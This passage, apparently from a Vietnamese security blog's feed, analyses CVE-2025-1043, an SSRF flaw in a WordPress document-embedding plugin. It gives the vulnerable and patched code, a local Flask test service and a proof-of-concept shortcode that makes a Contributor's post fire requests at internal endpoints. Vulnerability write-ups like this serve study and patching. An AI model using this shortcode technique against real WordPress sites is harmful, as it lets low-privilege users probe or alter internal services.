Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-tables/vulnerability/wordpress-ninja-tables-easy-data-table-builder-plugin-5-0-18-unauthenticated-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables Plugin &amp;lt;= 5.0.18 is vulnerable to Server Side Request Forgery (SSRF)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-1043 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-02-cve-2025-1043/</link>
      <pubDate>Sun, 02 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-02-cve-2025-1043/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-02-cve-2025-1043/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Plugin &amp;ldquo;Embed Any Document – Embed PDF, Word, PowerPoint and Excel Files&amp;rdquo;&lt;/strong&gt; cho WordPress có lỗ hổng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; trong tất cả các phiên bản đến và bao gồm &lt;strong&gt;2.7.5&lt;/strong&gt; thông qua shortcode &lt;code&gt;&#39;embeddoc&#39;&lt;/code&gt;. Lỗ hổng này cho phép những kẻ tấn công đã xác thực, có quyền truy cập ở mức &lt;strong&gt;Contributor&lt;/strong&gt; trở lên, thực hiện các yêu cầu web tới các địa chỉ tùy ý xuất phát từ ứng dụng web và có thể được sử dụng để truy vấn và sửa đổi thông tin từ các dịch vụ nội bộ.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-1043&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-1043&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.7.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.7.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/embed-any-document/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed Any Document Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Embed Any Document&lt;/strong&gt;: &lt;strong&gt;2.7.5&lt;/strong&gt; (vulnerable) và &lt;strong&gt;2.7.6&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function embed_shortcode( $atts ) {&#xA;    ...&#xA;    $show             = false;&#xA;    $shortcode_atts   = shortcode_atts(&#xA;        array(&#xA;            &amp;#39;url&amp;#39;      =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;drive&amp;#39;    =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;viewer&amp;#39;   =&amp;gt; $default_provider,&#xA;            &amp;#39;download&amp;#39; =&amp;gt; $default_download,&#xA;            ...&#xA;        ),&#xA;        $atts&#xA;    );&#xA;&#xA;    if ( isset( $shortcode_atts[&amp;#39;url&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $shortcode_atts[&amp;#39;url&amp;#39;] ) ) :&#xA;        ...&#xA;        if ( $this-&amp;gt;allowdownload( $shortcode_atts[&amp;#39;viewer&amp;#39;] ) ) {&#xA;            if ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;alluser&amp;#39; || $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;all&amp;#39; ) {&#xA;                $show = true;&#xA;            } elseif ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;logged&amp;#39; &amp;amp;&amp;amp; is_user_logged_in() ) {&#xA;                $show = true;&#xA;            }&#xA;        }&#xA;        $url = esc_url( $shortcode_atts[&amp;#39;url&amp;#39;], array( &amp;#39;http&amp;#39;, &amp;#39;https&amp;#39; ) );&#xA;        if ( $show ) {&#xA;            $filedata = wp_remote_head( $shortcode_atts[&amp;#39;url&amp;#39;] );&#xA;            ...&#xA;        }&#xA;    ...&#xA;    return $embed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, hàm &lt;code&gt;embed_shortcode()&lt;/code&gt; thực hiện một HTTP HEAD request bằng hàm &lt;code&gt;wp_remote_head()&lt;/code&gt; với giá trị &lt;code&gt;url&lt;/code&gt; được lấy trực tiếp từ &lt;code&gt;$shortcode_atts[&#39;url&#39;]&lt;/code&gt;. Do không có bất kỳ cơ chế xác thực, lọc, hoặc giới hạn phạm vi URL, kẻ tấn công có thể chèn vào đó một đường dẫn tùy ý =&amp;gt; Dẫn đến request có thể gửi đến các local service khác gấy &lt;strong&gt;SSRF&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function embed_shortcode( $atts ) {&#xA;    ...&#xA;    $show             = false;&#xA;    $shortcode_atts   = shortcode_atts(&#xA;        array(&#xA;            &amp;#39;url&amp;#39;      =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;drive&amp;#39;    =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;viewer&amp;#39;   =&amp;gt; $default_provider,&#xA;            &amp;#39;download&amp;#39; =&amp;gt; $default_download,&#xA;            ...&#xA;        ),&#xA;        $atts&#xA;    );&#xA;&#xA;    if ( isset( $shortcode_atts[&amp;#39;url&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $shortcode_atts[&amp;#39;url&amp;#39;] ) ) :&#xA;        ...&#xA;        if ( $this-&amp;gt;allowdownload( $shortcode_atts[&amp;#39;viewer&amp;#39;] ) ) {&#xA;            if ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;alluser&amp;#39; || $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;all&amp;#39; ) {&#xA;                $show = true;&#xA;            } elseif ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;logged&amp;#39; &amp;amp;&amp;amp; is_user_logged_in() ) {&#xA;                $show = true;&#xA;            }&#xA;        }&#xA;        $url = esc_url( $shortcode_atts[&amp;#39;url&amp;#39;], array( &amp;#39;http&amp;#39;, &amp;#39;https&amp;#39; ) );&#xA;        if ( $show ) {&#xA;            $filedata = wp_safe_remote_head( $shortcode_atts[&amp;#39;url&amp;#39;] );&#xA;            ...&#xA;        }&#xA;    ...&#xA;    return $embed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã thay thế việc sử dụng &lt;code&gt;wp_remote_head()&lt;/code&gt; bằng hàm &lt;strong&gt;&lt;code&gt;wp_safe_remote_head()&lt;/code&gt;&lt;/strong&gt;, hàm này bổ sung các cơ chế kiểm tra an toàn nhằm &lt;strong&gt;ngăn chặn truy cập đến các địa chỉ nội bộ, private, loopback hoặc link-local&lt;/strong&gt;, qua đó &lt;strong&gt;giảm thiểu nguy cơ tấn công SSRF&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Để đoạn &lt;code&gt;wp_remote_head( $shortcode_atts[&#39;url&#39;] )&lt;/code&gt; trong &lt;code&gt;embed_shortcode()&lt;/code&gt; thực sự được gọi, ta cần &lt;strong&gt;bypass&lt;/strong&gt; tất cả các ràng buộc sau:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;url&lt;/code&gt; phải tồn tại và không rỗng&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( isset( $shortcode_atts[&amp;#39;url&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $shortcode_atts[&amp;#39;url&amp;#39;] ) )&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Biến &lt;code&gt;$show&lt;/code&gt; phải được đặt thành true trước khi vào khối gọi HEAD&#xA;&lt;code&gt;$show&lt;/code&gt; mặc định &lt;code&gt;false&lt;/code&gt;. Nó chỉ trở thành &lt;code&gt;true&lt;/code&gt; khi &lt;code&gt;if ( $this-&amp;gt;allowdownload( $shortcode_atts[&#39;viewer&#39;] ) )&lt;/code&gt; trả về &lt;code&gt;true&lt;/code&gt; và một trong hai điều kiện sau đúng:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $this-&amp;gt;allowdownload( $shortcode_atts[&amp;#39;viewer&amp;#39;] ) ) {&#xA;    if ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;alluser&amp;#39; || $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;all&amp;#39; ) {&#xA;        $show = true;&#xA;    } elseif ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;logged&amp;#39; &amp;amp;&amp;amp; is_user_logged_in() ) {&#xA;        $show = true;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;download&lt;/code&gt; bằng &lt;code&gt;&#39;alluser&#39;&lt;/code&gt; hoặc &lt;code&gt;&#39;all&#39;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;download&lt;/code&gt; bằng &lt;code&gt;&#39;logged&#39;&lt;/code&gt; và &lt;code&gt;is_user_logged_in()&lt;/code&gt; trả về &lt;code&gt;true&lt;/code&gt; (tức người dùng đã đăng nhập).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function allowdownload( $provider ) {&#xA;    $blacklist = array( &amp;#39;drive&amp;#39;, &amp;#39;box&amp;#39; );&#xA;    if ( in_array( $provider, $blacklist, true ) ) {&#xA;        return false;&#xA;    } else {&#xA;        return true;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;allowdownload()&lt;/code&gt; sẽ trả về &lt;code&gt;true&lt;/code&gt; nếu &lt;code&gt;$provider ($shortcode_atts[&#39;viewer&#39;])&lt;/code&gt; không tồn tại hoặc không nằm trong &lt;code&gt;$blacklist&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;Vì SSRF dùng HTTP HEAD nên &lt;strong&gt;không đọc được body trực tiếp&lt;/strong&gt;, nhưng vẫn có thể lộ &lt;strong&gt;metadata&lt;/strong&gt; (Content-Type, Content-Length) và thăm dò/khám phá các endpoint nội bộ. Nếu endpoint &lt;strong&gt;không phân biệt method&lt;/strong&gt; có thể dẫn đến thay đổi, xóa dữ liệu nhạy cảm.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;&lt;code&gt;embed_shortcode()&lt;/code&gt; được đăng ký làm callback cho shortcode:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_shortcode( &amp;#39;embeddoc&amp;#39;, array( $this, &amp;#39;embed_shortcode&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Shortcode: [embeddoc url=...]&amp;#34;] --&amp;gt; B[&amp;#34;embed_shortcode($atts)&amp;#34;]&#xA;B --&amp;gt; C{&amp;#34;isset($shortcode_atts[&amp;#39;url&amp;#39;]) &amp;amp;&amp;amp; !empty(...)?&amp;#34;}&#xA;C -- Yes --&amp;gt; D{&amp;#34;$this-&amp;gt;allowdownload($shortcode_atts[&amp;#39;viewer&amp;#39;])?&amp;#34;}&#xA;C -- No --&amp;gt; End1[No request]&#xA;D -- Yes --&amp;gt; E{&amp;#34;download == &amp;#39;all&amp;#39;|&amp;#39;alluser&amp;#39; OR (download==&amp;#39;logged&amp;#39; &amp;amp;&amp;amp; is_user_logged_in())?&amp;#34;}&#xA;D -- No --&amp;gt; End2[No request]&#xA;E -- Yes --&amp;gt; F[&amp;#34;wp_remote_head($shortcode_atts[&amp;#39;url&amp;#39;]) ← SSRF sink&amp;#34;]&#xA;E -- No --&amp;gt; End3[No request]&#xA;F --&amp;gt; G[&amp;#34;Return to client&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo local service đơn giản bằng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;@app.route(&amp;#39;/delete&amp;#39;)&#xA;def delete():&#xA;    file_id = request.args.get(&amp;#39;id&amp;#39;)&#xA;    if not file_id:&#xA;        return &amp;#34;No id provided&amp;#34;, 400&#xA;    print(f&amp;#34;delete it: {file_id}&amp;#34;)&#xA;    return f&amp;#34;Delete it: {file_id}&amp;#34;&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;content&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Login bằng tài khoản Contributor&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Tạo post với shortcode&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;[embeddoc url=http://localhost:8001/delete?id=1 download=all]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-02-cve-2025-1043/result.png&#34; title=&#34;HEAD request tới local service&#34; data-thumbnail=&#34;/posts/2025-11-02-cve-2025-1043/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;HEAD request tới local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-02-cve-2025-1043/result.png&#39; alt=&#34;Result&#34; height=&#34;283&#34; width=&#34;587&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;HEAD request tới local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; 